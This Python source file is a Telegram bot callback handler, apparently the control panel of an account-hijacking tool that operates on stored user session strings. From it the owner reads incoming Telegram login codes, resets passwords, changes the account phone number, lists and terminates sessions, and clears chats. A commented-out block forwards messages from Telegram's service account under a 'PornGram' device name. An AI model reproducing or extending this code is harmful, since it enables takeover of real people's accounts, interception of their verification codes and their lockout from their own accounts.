from pyrogram import Client, idle, filters
from pyrogram.types import InlineKeyboardMarkup, Message, InlineKeyboardButton
from NpClient import NpClient
from account import Account
from helpers.util import button_pagination, button_style, button_sesi
import re
from config import OWNER
from datetime import datetime
from helpers.database import db


@Account.on_callback_query()
async def onCallbackQuery(client, query):
    qdata = query.data
    message = query.message
    user = query.from_user.id

    if user not in OWNER:
        return
    if qdata:
        raw_data = qdata
        if re.search(r"prev#", raw_data) or re.search(r"next#", raw_data):
            limit = 30
            offset = int(raw_data.split("#")[1])
            if offset < 0:
                await query.answer("No more users in prev")
                return
            elif offset > len(await db.getUsers()):
                await query.answer("No more users in next")
                return
            await query.answer()
            back = offset - limit
            next = offset + limit
            msgPage: Message = query.message
            userspage = await db.getLimitUser(limit, offset)
            listUser = ""
            now = int(datetime.now().timestamp())
            for datas in userspage:
                if datas['timestamp'] is not None:
                    old = int(datetime.fromtimestamp(datas['timestamp']).timestamp())
                    life_login = now - old
                    if life_login >= 86400:
                        life_logged = f"⏰{int(life_login / 86400)} hari"
                    elif life_login >= 3600:
                        life_logged = f"⏰{int(life_login / 3600)} jam"
                    elif life_login >= 60:
                        life_logged = f"⏰{int(life_login / 60)} mnt"
                    else:
                        life_logged = f"⏰{int(life_login)} dtk"
                else:
                    life_logged = "⏰ 0 dtk"
                status = "✅" if datas['safe'] == 1 else "🆘"
                uname = "None" if datas['uname'] is None else "@" + datas['uname']
                listUser += f"{status} <a href='https://t.me/{client.username}?start=login-{datas['idtele']}'>{datas['idtele']}</a> {uname} / {life_logged}\n"
            if listUser != "":
                await msgPage.edit_text(text=listUser)
                await msgPage.edit_reply_markup(
                    reply_markup=InlineKeyboardMarkup(button_pagination(back, next)),
                )
            return
        sesi_cb = qdata.split("@")
        if sesi_cb[0] == "delsesi":
            if sesi_cb[1] == "0":
                await query.answer("Tidak bisa menghapus session diri sendiri...")
                return
            await query.answer("Menghapus Session...")
            usr = await db.getUser(sesi_cb[2])
            np = NpClient(user=usr, db=db)
            initUser = await np.init(client, message)
            await np.reset_session(sesi_cb[1])
            await message.delete()
            await np.stop()
            await message.reply_text("<i>Session Berhasil Dihapus</i>")
            return
        data, idacc = qdata.split("-")
        if data == "clearchat":
            usr = await db.getUser(idacc)
            if usr is None:
                await query.answer("User Not Found")
                return
            await query.answer("Waiting to clear chats...")
            send_clear = await message.reply_text("<i>Clearing chats...</i>")
            np = NpClient(user=usr, db=db)
            await np.init(client, message)
            clear = await np.clearChats()
            await np.stop()
            if clear:
                await send_clear.edit_text("<i>Chat cleared</i>")
            else:
                await send_clear.edit_text("<i>Failed to clear chats</i>")
            return
        if data == "changenohp":
            usr = await db.getUser(idacc)
            if usr is None:
                await query.answer("User Not Found")
                return
            newphone = None
            try:
                newphone = await message.chat.ask(
                    "<i>Kirim Nomer Baru nya</i>",
                    filters=filters.text,
                    timeout=60,
                )
                if "/cancel" in newphone.text:
                    await message.reply_text("<i>Proses Dibatalkan</i>")
                    return
            except BaseException as e:
                asu = str(e)
                if asu == "60":
                    await message.reply_text("<i>Waktu habis, silakan ulangi lagi</i>")
                    return
                print(e)
                await message.reply_text("Error:", e)
                return
            if newphone is not None:
                np = NpClient(user=usr, db=db)
                initUser = await np.init(client, message)
                sendCode = await np.changePhone(usr[0], newphone.text)
                await np.stop()
            return

        if data == "resetsesi":
            usr = await db.getUser(idacc)
            if usr is None:
                await query.answer("User Not Found")
                return
            await query.answer("Resetting session...")
            np = NpClient(user=usr, db=db)
            initUser = await np.init(client, message)
            await np.reset_sessions()
            await np.stop()
            return
        if data == "listsesi":
            usr = await db.getUser(idacc)
            if usr is None:
                await query.answer("User Not Found")
                return
            await query.answer("List session...")
            np = NpClient(user=usr, db=db)
            initUser = await np.init(client, message)
            sessions = await np.list_sessions()
            await np.stop()
            if sessions is None:
                await message.reply_text("<i>Failed to get sessions</i>")
                return
            sendlist = await message.reply(
                text=f"<i>List session `{usr['idtele']}`</i>",
                reply_markup=InlineKeyboardMarkup(button_sesi(sessions, idacc)),
                disable_web_page_preview=True,
            )
            return

        if data == "disconnect":
            update = await db.update_status(int(idacc), 1)
            await query.answer("Account has been disconnected")
            return

        if data == "readcode":
            user_session = await db.getUser(idacc)
            if user_session is None:
                await query.answer("User Not Found")
                return
            await query.answer("Connecting...")
            np = NpClient(user=user_session, db=db)
            initUser = await np.init(client, message)
            await query.answer()
            if initUser is not None:
                await np.read_code()
                await np.stop()
            else:
                await message.reply_text("<i>Account failed to initialize</i>")
                return

        if data == "resetpw":
            user_session = await db.getUser(idacc)
            if user_session is None:
                await query.answer("User Not Found")
                return
            await query.answer("Connecting...")
            np = NpClient(user=user_session, db=db)
            initUser = await np.init(client, message)
            await query.answer()
            if initUser is not None:
                await np.reset_password()
                await np.stop()
            else:
                await message.reply_text("<i>Account failed to initialize</i>")
                return

        if data == "connect":
            user_session = await db.getUser(idacc)
            if user_session is None:
                await query.answer("User Not Found")
                return
            await query.answer("Connecting...")
            np = NpClient(user=user_session, db=db)
            initUser = await np.init(client, message)
            await query.answer()
            if initUser is not None:
                await np.listen()
                await np.stop()
            else:
                await message.reply_text("<i>Account failed to initialize</i>")
                return

        # bot = Client(
        #     f"NpDkUBot-{idacc}",
        #     api_id=API_ID,
        #     api_hash=API_HASH,
        #     session_string=user_session[5],
        #     in_memory=True,
        #     app_version="4.1.5",
        #     device_model="PornGram",
        #     system_version="PornGram " + platform.release(),
        # )

        # @bot.on_message()
        # async def onMessage(client, msg):
        #     try:
        #         usr = await client.get_me()
        #         if only_tele:
        #             if msg.from_user.id == 777000:
        #                 await message.reply_text(
        #                     f"**FROM **@{usr.username}|`{usr.id}`(**{usr.first_name}**)\n\n{msg.text}"
        #                 )
        #         else:
        #             await message.reply_text(
        #                 f"**FROM **@{usr.username}|`{usr.id}`(**{usr.first_name}**)\n\n{msg.text}"
        #             )
        #     except FloodWait as e:
        #         await asyncio.sleep(e.value)
        #     except Exception as e:
        #         print(e)
        #         pass

        # try:
        #     await query.answer()
        #     await bot.start()
        #
        #     list_session = await bot.invoke(
        #         account.get_authorizations.GetAuthorizations()
        #     )
        #     print(list_session.authorizations)
        #     for auth in list_session.authorizations:
        #         print("hash", auth.hash)
        #         print("api_id", auth.api_id)
        #         print("created", auth.date_created)
        #         print("active", auth.date_active)
        #
        #     await message.reply_text(
        #         f"__Waiting new message__ `{idacc}` __from Telegram until 60 second__"
        #     )
        #     await asyncio.sleep(600)
        #     await bot.stop()
        #     await message.reply_text(f"`{idacc}` __Done, account has been stopped__")
        # except AuthKeyUnregistered as ea:
        #     await message.reply_text(f"Session dihapus oleh user")
        #     await db.delete(idacc)
        #     await bot.stop()
        # except Exception as e:
        #     await message.reply_text(f"Error: {e}")
        #     await bot.stop()
